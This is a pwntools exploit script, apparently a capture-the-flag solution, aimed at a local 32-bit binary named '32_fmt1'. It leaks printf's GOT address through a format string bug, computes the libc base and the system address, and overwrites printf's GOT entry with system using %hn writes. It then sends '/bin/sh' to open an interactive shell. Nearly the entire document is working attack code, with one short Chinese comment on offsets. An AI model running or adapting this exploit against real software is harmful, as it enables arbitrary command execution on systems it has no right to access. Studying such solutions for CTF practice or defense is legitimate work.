from pwn import *
from LibcSearcher import *
context(log_level='debug',os='linux',arch='i386')
pwnfile = './32_fmt1'
io=process(pwnfile)
elf = ELF(pwnfile)
libc = ELF('./libc-2.23.so')

printf_got = elf.got['printf']

gdb.attach(io)
pause()

pay = p32(printf_got)+b'%6$s'
io.sendlineafter("repeater?",pay)
printf_adr = u32(io.recvuntil("\xf7")[-4:])
print("printf--->",hex(printf_adr))


#libc = LibcSearcher('printf',printf_adr)
libc_base = printf_adr-libc.sym['printf']
print("libc_base-->",hex(libc_base))
sys_adr=libc_base+libc.sym['system']
print("sys_adr-->",hex(sys_adr))
'''
offset = 6
payload = fmtstr_payload(offset,{printf_got:sys_adr})
print("payload-->",payload)
'''

high_sys = (sys_adr >> 16) & 0xffff
low_sys = sys_adr & 0xffff


payload = p32(printf_got) + p32(printf_got+2)
payload += b'%'+str(low_sys-8).encode("utf-8")+b'c%6$hn'
payload += b'%'+str(high_sys-low_sys).encode("utf-8")+b'c%7$hn'


# offset及偏移多少位  {a：b}及将b写入a
io.sendlineafter("\n",payload)

io.sendlineafter("\n",b'/bin/sh\x00')
io.interactive()
